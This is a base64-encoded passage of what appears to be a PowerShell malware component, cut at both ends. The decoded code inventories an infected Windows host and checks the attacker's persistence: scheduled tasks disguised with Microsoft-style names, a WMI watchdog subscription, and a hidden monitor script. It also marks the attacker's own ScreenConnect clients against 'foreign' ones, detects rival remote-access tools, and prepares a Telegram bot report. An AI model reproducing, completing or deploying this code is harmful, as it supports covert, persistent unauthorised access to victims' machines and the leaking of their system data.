IFdpbjMyX0NvbXB1dGVyU3lzdGVtDQogICAgICAgICRvLkRvbWFpbiA9IGlmICgkY3MuUGFydE9m
RG9tYWluKSB7ICRjcy5Eb21haW4gfSBlbHNlIHsgJGNzLldvcmtncm91cCB9DQogICAgICAgICRv
Lk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFjdHVyZXINCiAgICAgICAgJG8uTW9kZWwgPSAkY3Mu
TW9kZWwNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJG8uQ1BVID0gKEdldC1D
aW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzb3IgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxIC1FeHBh
bmRQcm9wZXJ0eSBOYW1lKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5T
ZXJpYWwgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX0JJT1MpLlNlcmlhbE51bWJlcg0KICAgIH0g
Y2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkZCA9IEdldC1DaW1JbnN0YW5jZSBXaW4zMl9M
b2dpY2FsRGlzayAtRmlsdGVyICJEZXZpY2VJRD0nQzonIg0KICAgICAgICAkby5EaXNrRnJlZV9H
QiA9IFttYXRoXTo6Um91bmQoJGQuRnJlZVNwYWNlIC8gMUdCLCAxKQ0KICAgICAgICAkby5EaXNr
U2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwgMSkNCiAgICB9IGNhdGNoIHt9
DQogICAgcmV0dXJuICRvDQp9DQoNCmZ1bmN0aW9uIEdldC1TdmNMaW5lKFtzdHJpbmddJG5hbWUp
IHsNCiAgICAkcyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlDQogICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICdOT1QgSU5TVEFMTEVEJyB9DQog
ICAgcmV0dXJuICgnezB9IChTdGFydD17MX0pJyAtZiAkcy5TdGF0dXMsICRzLlN0YXJ0VHlwZSkN
Cn0NCg0KZnVuY3Rpb24gR2V0LVRhc2tIZWFsdGgoW3N0cmluZ10kdG4pIHsNCiAgICAkb3V0ID0g
JiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlm
ICgkTEFTVEVYSVRDT0RFIC1uZSAwIC1vciAtbm90ICRvdXQpIHsNCiAgICAgICAgcmV0dXJuIEB7
IFByZXNlbnQgPSAkZmFsc2U7IFN0YXR1cyA9ICdNSVNTSU5HJzsgTmV4dCA9ICcnOyBMYXN0ID0g
Jyc7IFJlc3VsdCA9ICcnIH0NCiAgICB9DQogICAgJG1hcCA9IEB7fQ0KICAgIGZvcmVhY2ggKCRs
aW5lIGluICRvdXQpIHsNCiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbXjpdKyk6XHMq
KC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkbWFwWyRtYXRjaGVzWzFdLlRyaW0oKV0gPSAkbWF0
Y2hlc1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICAkc3RhdHVzID0gJG1hcFsnU3Rh
dHVzJ10NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1
cyddIH0NCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAncHJlc2VudCcgfQ0KICAg
ICRuZXh0ID0gJG1hcFsnTmV4dCBSdW4gVGltZSddDQogICAgaWYgKC1ub3QgJG5leHQpIHsgJG5l
eHQgPSAnJyB9DQogICAgJGxhc3QgPSAkbWFwWydMYXN0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5v
dCAkbGFzdCkgeyAkbGFzdCA9ICcnIH0NCiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1bHQn
XQ0KICAgIGlmICgtbm90ICRyZXN1bHQpIHsgJHJlc3VsdCA9ICcnIH0NCiAgICAkaGVhbHRoeSA9
ICgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNl
bnQnKQ0KICAgIHJldHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgSGVh
bHRoeSA9IFtib29sXSRoZWFsdGh5DQogICAgICAgIFN0YXR1cyAgPSAkc3RhdHVzDQogICAgICAg
IE5leHQgICAgPSAkbmV4dA0KICAgICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0
ICA9ICRyZXN1bHQNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAkdG9r
ZW5zID0gQCgNCiAgICAgICAgJ0FueURlc2snLCAnVGVhbVZpZXdlcicsICd0dm5zZXJ2ZXInLCAn
RFdBZ2VudCcsICdEV1NlcnZpY2UnLCAnTG9nTWVJbicsICdMTUlHdWFyZGlhbicsDQogICAgICAg
ICdXaW5WTkMnLCAndm5jc2VydmVyJywgJ3R2XycsICdTcGxhc2h0b3AnLCAnWm9obycsICdSdXN0
RGVzaycsICdSZW1vdGVQQycsICdEYW1lV2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0
ZXJhJywgJ05pbmphUk1NJywgJ05pbmphT25lJywgJ05pbmphJywgJ0thc2V5YScsICdQdWxzZXdh
eScsICdTeW5jcm8nLA0KICAgICAgICAnU3VwZXJPcHMnLCAnTWFuYWdlRW5naW5lJywgJ1NvbGFy
V2luZHMnLCAnQ29ubmVjdFdpc2UnLCAnTFRTZXJ2aWNlJywgJ0xhYlRlY2gnLA0KICAgICAgICAn
QWN0aW9uMScsICdTaW1wbGVIZWxwJywgJ0JvbWdhcicsICdCZXlvbmRUcnVzdCcsICdNZXNoQWdl
bnQnLCAnTWVzaCBDZW50cmFsJywNCiAgICAgICAgJ1RhY3RpY2FsUk1NJywgJ3RhY3RpY2Fscm1t
JywgICAgICAgICAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19o
b3N0JywNCiAgICAgICAgJ0Nocm9tZSBSZW1vdGUgRGVza3RvcCcsICdQYXJzZWMnLCAnTmV0U3Vw
cG9ydCcsICdMZXZlbC5pbycsICdMZXZlbCBBZ2VudCcsDQogICAgICAgICdEYXR0byBSTU0nLCAn
Q29udGludXVtJw0KICAgICkNCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJHNlZW4gPSBAe30NCg0KICAgIGZ1bmN0aW9u
IEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkgew0KICAgICAgICAka2V5ID0g
IiRraW5kfCRuYW1lIi5Ub0xvd2VySW52YXJpYW50KCkNCiAgICAgICAgaWYgKCRzZWVuLkNvbnRh
aW5zS2V5KCRrZXkpKSB7IHJldHVybiB9DQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUNCiAg
ICAgICAgW3ZvaWRdJGhpdHMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+JyAtZiAka2lu
ZCwgKEVzYyAkbmFtZSkpKQ0KICAgIH0NCg0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkbiA9ICRfLk5hbWUN
CiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICBpZiAoJG4gLWxpa2UgJ1NjcmVl
bkNvbm5lY3QgQ2xpZW50KicpIHsgcmV0dXJuIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRv
a2Vucykgew0KICAgICAgICAgICAgaWYgKCRuIC1saWtlICIqJHQqIiAtb3IgJGQgLWxpa2UgIiok
dCoiKSB7DQogICAgICAgICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykp
IikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAg
fQ0KDQogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7DQogICAgICAgICRuID0gJF8uUHJvY2Vzc05hbWUNCiAgICAgICAgaWYgKCRu
IC1saWtlICcqU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0
IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAg
ICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5pbnN0ID0gQCgNCiAgICAgICAg
J0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFs
bFwqJywNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5k
b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0
aCBpbiAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4g
PSBbc3RyaW5nXSRfLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0NCiAgICAgICAgICAgIGlmICgkZG4gLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0
dXJuIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAg
ICAgICBpZiAoJGRuIC1saWtlICIqJHQqIikgew0KICAgICAgICAgICAgICAgICAgICBBZGQtSGl0
ICdtc2knICRkbg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIH0N
CiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkaGl0cw0KfQ0K
DQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAgJGxpc3QgPSBOZXctT2JqZWN0IFN5c3Rl
bS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgIEdldC1TZXJ2aWNlIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkZnAg
PSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0g
fSBlbHNlIHsgJz8nIH0NCiAgICAgICAgJHRhZyA9IGlmICgkZnAgLWVxICc1ZjYwMTA1Nzk4NTJl
NTA3JykgeyAnS0VFUC1QUklNQVJZJyB9DQogICAgICAgIGVsc2VpZiAoJGZwIC1lcSAnZjg2MWM4
MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAgIGVsc2UgeyAnRk9SRUlHTicgfQ0K
ICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4g
W3syfV0nIC1mIChFc2MgJF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcp
KQ0KICAgIH0NCg0KICAgICRyb290cyA9IEAoDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXN9
XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIg0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0IGluICRy
b290cykgew0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXQgLURpcmVjdG9yeSAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAg
IFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5G
dWxsTmFtZSkpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgJHVuaW5zdCA9IEAoDQogICAgICAg
ICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3Rh
bGxcKicsDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2lu
ZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicNCiAgICApDQogICAgZm9yZWFjaCAoJHBh
dGggaW4gJHVuaW5zdCkgew0KICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICRfLkRp
c3BsYXlOYW1lIC1saWtlICcqU2NyZWVuQ29ubmVjdConDQogICAgICAgIH0gfCBGb3JFYWNoLU9i
amVjdCB7DQogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRpc3BsYXlWZXJzaW9uKSB7ICRfLkRp
c3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQo
KCctIG1zaTogPGNvZGU+ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwg
KEVzYyAkdmVyKSkpDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoJGxpc3QuQ291bnQgLWVx
IDApIHsgW3ZvaWRdJGxpc3QuQWRkKCctIChub25lKScpIH0NCiAgICByZXR1cm4gJGxpc3QNCn0N
Cg0KJGNmZyA9IEdldC1DZmcNCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcu
Q0hBVF9JRCkgew0KICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3Jr
RGlyICdib290LmVycicpIC1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlDQogICAgZXhpdCAyDQp9DQoNCiRwcmltID0gJ1NjcmVlbkNvbm5lY3QgQ2xp
ZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScNCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4
NjFjODE0MGQ0NTM0MjcpJw0KJG9zID0gR2V0LU9zSW5mbw0KJHdobyA9IFtTZWN1cml0eS5Qcmlu
Y2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUNCiRlbGV2ID0gKFtTZWN1
cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
d3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoDQogICAgW1NlY3VyaXR5LlByaW5j
aXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScNCg0K
JG1zaUNhY2hlID0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2cubXNpJw0KJG1zaVNpemUgPSBpZiAo
VGVzdC1QYXRoICRtc2lDYWNoZSkgew0KICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1z
aUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8gMUtCKQ0KfSBlbHNlIHsgJ25vbmUnIH0NCg0KJG1vblBh
dGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJw0KJGV0bE1vbiA9ICIkZW52OlBy
b2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlXGV0bF9tb24uY21k
Ig0KJGhhc01vbiA9IFRlc3QtUGF0aCAkbW9uUGF0aA0KJGhhc0V0bCA9IFRlc3QtUGF0aCAkZXRs
TW9uDQoNCiMgcGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9t
IGlkZW50aXR5LmNmZyB3aGVuIHByZXNlbnQNCiRpZENmZyA9IEpvaW4tUGF0aCAkV29ya0RpciAn
aWRlbnRpdHkuY2ZnJw0KJGlkTWFwID0gQHt9DQppZiAoVGVzdC1QYXRoICRpZENmZykgew0KICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkaWRDZmcgfCBGb3JFYWNoLU9iamVjdCB7DQogICAg
ICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRN
YXBbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgIH0NCn0NCiRleHBlY3RlZFRhc2tz
ID0gQCgNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19B
IH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcgfSk7IFJv
bGUgPSAidGljayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQo
aWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAnXE1pY3Jvc29mdFxX
aW5kb3dzXFBMQVxTZXJ2ZXInIH0pOyBSb2xlID0gImJhY2t1cCAkKCRpZE1hcC5NT19CKW0gKGNo
YWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRB
U0tfQyB9IGVsc2UgeyAnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcgfSk7
IFJvbGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFw
LlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcVGNw
aXBcSXBBZGRyZXNzQ29uZmxpY3QxJyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9DQop
DQojIGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24NCiR3bWlDID0gR2V0LVdtaU9i
amVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50
Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdhdGNoZG9nQyciIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlDQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNo
ZVdhdGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5l
ICR3bWlDKSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0YXNrQmFkID0gMA0KZm9yZWFjaCAo
JHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7
DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRhc2tPaysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsg
JHRhc2tCYWQrKzsgJG1hcmsgPSAnTUlTU0lORycgfQ0KICAgICAgICBbdm9pZF0kdGFza0xpbmVz
LkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfScgLWYgJG1hcmssIChFc2MgJHQu
TmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIH0NCiAgICAkaCA9
IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0
aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAgICAgICRtYXJrID0gJ09LJw0KICAgIH0gZWxz
ZWlmICgkaC5QcmVzZW50KSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAn
V0VBSycNCiAgICB9IGVsc2Ugew0KICAgICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0g
J01JU1NJTkcnDQogICAgfQ0KICAgICRleHRyYSA9ICcnDQogICAgaWYgKCRoLlByZXNlbnQpIHsN
CiAgICAgICAgJGJpdHMgPSBAKCkNCiAgICAgICAgaWYgKCRoLlN0YXR1cykgeyAkYml0cyArPSAk
aC5TdGF0dXMgfQ0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJlc3VsdCAt
bmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9DQogICAgICAg
IGlmICgkYml0cy5Db3VudCkgeyAkZXh0cmEgPSAnICgnICsgKCRiaXRzIC1qb2luICcsICcpICsg
JyknIH0NCiAgICB9DQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2RlPnsx
fTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJvbGUp
LCAoRXNjICRleHRyYSkpKQ0KfQ0KDQokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQ0KJGFs
dExpbmUgPSBHZXQtU3ZjTGluZSAkYWx0DQokcHJpbU9rID0gJHByaW1MaW5lIC1saWtlICdSdW5u
aW5nKicNCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFz
TW9uDQoNCiRlbW9qaU1hcCA9IEB7DQogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3
MDUpDQogICAgRE9XTiAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgx
RjZBOCkpDQogICAgUkVTVE9SRUQgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIo
MHgxRjdFMikpDQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpDQogICAgRk9S
Q0UgICAgPSBbc3RyaW5nXShbY2hhcl0weDI2QTEpDQogICAgREVQTE9ZICAgPSAoW3N0cmluZ11b
Y2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjY4MCkpDQogICAgSEIgICAgICAgPSAoW3N0cmlu
Z11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpDQp9DQoka2V5ID0gJFN0YXRlLlRv
VXBwZXJJbnZhcmlhbnQoKQ0KJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5
KSkgeyAkZW1vamlNYXBbJGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJv
bVV0ZjMyKDB4MUY0RjEpKSB9DQoNCiR0aXRsZSA9IHN3aXRjaCAoJGtleSkgew0KICAgICdPSycg
eyAnUHJpbWFyeSBoZWFsdGh5JyB9DQogICAgJ0RPV04nIHsgJ1ByaW1hcnkgRE9XTiAtIGhlYWxp
bmcnIH0NCiAgICAnUkVTVE9SRUQnIHsgJ1ByaW1hcnkgUkVTVE9SRUQnIH0NCiAgICAnRkFJTCcg
eyAnSGVhbCBGQUlMRUQnIH0NCiAgICAnRk9SQ0UnIHsgJ0ZvcmNlZCByZWluc3RhbGwnIH0NCiAg
ICAnREVQTE9ZJyB7IGlmICgkZGVwbG95T2spIHsgJ0ZJUlNUIERFUExPWSBPSycgfSBlbHNlIHsg
J0ZJUlNUIERFUExPWSAtIENIRUNLIE5FRURFRCcgfSB9DQogICAgJ0hCJyB7ICdob3VybHkgZGln
ZXN0JyB9DQogICAgZGVmYXVsdCB7ICJTdGF0ZTogJFN0YXRlIiB9DQp9DQoNCiR0cmFucyA9IGlm
ICgkT2xkU3RhdGUpIHsgIiRPbGRTdGF0ZSAtPiAkU3RhdGUiIH0gZWxzZSB7ICRTdGF0ZSB9DQok
c2NMaXN0ID0gR2V0LVNjSW5zdGFsbHMNCiRybW1IaXRzID0gR2V0LVJtbUhpdHMNCmlmICgkcm1t
SGl0cy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kcm1tSGl0cy5BZGQoJy0gKG5vbmUgZGV0ZWN0ZWQp
JykgfQ0KDQokcHViID0gR2V0LVB1YmxpY0lwDQokbGFuID0gR2V0LUxvY2FsSXBzDQokbm93ID0g
R2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcyB6enonDQokdXB0aW1lID0gJ24v
YScNCnRyeSB7DQogICAgJGJvb3QgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX09wZXJhdGluZ1N5
c3RlbSkuTGFzdEJvb3RVcFRpbWUNCiAgICAkdXB0aW1lID0gJ3swOmRkfWQgezA6aGh9aCB7MDpt
bX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQ0KfSBjYXRjaCB7fQ0KDQojIGNhbXBhaWduIHN0
YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0aW9uKQ0KJHN0YXRlTGlu
ZSA9ICduL2EnDQokc3RhdGVPYmogPSAkbnVsbA0KJHN0YXRlUGF0aDIgPSBKb2luLVBhdGggJFdv
cmtEaXIgJ3N0YXRlLmpzb24nDQppZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgyKSB7DQogICAgJHJh
d1N0YXRlID0gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoMiAtUmF3KS5Ucmlt
KCkNCiAgICB0cnkgew0KICAgICAgICAkc3RhdGVPYmogPSAkcmF3U3RhdGUgfCBDb252ZXJ0RnJv
bS1Kc29uDQogICAgICAgICRmb3JlaWduQ3N2ID0gaWYgKCRzdGF0ZU9iai5mb3JlaWduKSB7ICgk
c3RhdGVPYmouZm9yZWlnbiAtam9pbiAnLCcpIH0gZWxzZSB7ICctJyB9DQogICAgICAgICRzdGF0
ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0KSBmb3Jl
aWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3RhdGVPYmou
dGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRlT2JqLmlu
c3RhbGxDb3VudCkiDQogICAgfSBjYXRjaCB7ICRzdGF0ZUxpbmUgPSAkcmF3U3RhdGUgfQ0KfQ0K
DQokZGVwbG95QmxvY2sgPSAnJw0KaWYgKCRrZXkgLWVxICdERVBMT1knKSB7DQogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQ0KICAgICRmb3JlaWduID0gQChHZXQtQ2hpbGRJdGVtIC1Q
YXRoICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxTY3JlZW5Db25uZWN0IENsaWVudCoiIC1EaXJlY3RvcnkgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5OYW1l
IC1ub3RtYXRjaCAnNWY2MDEwNTc5ODUyZTUwN3xmODYxYzgxNDBkNDUzNDI3JyB9KQ0KICAgICRk
aWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3Ry
aW5nXQ0KICAgICRib290UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAg
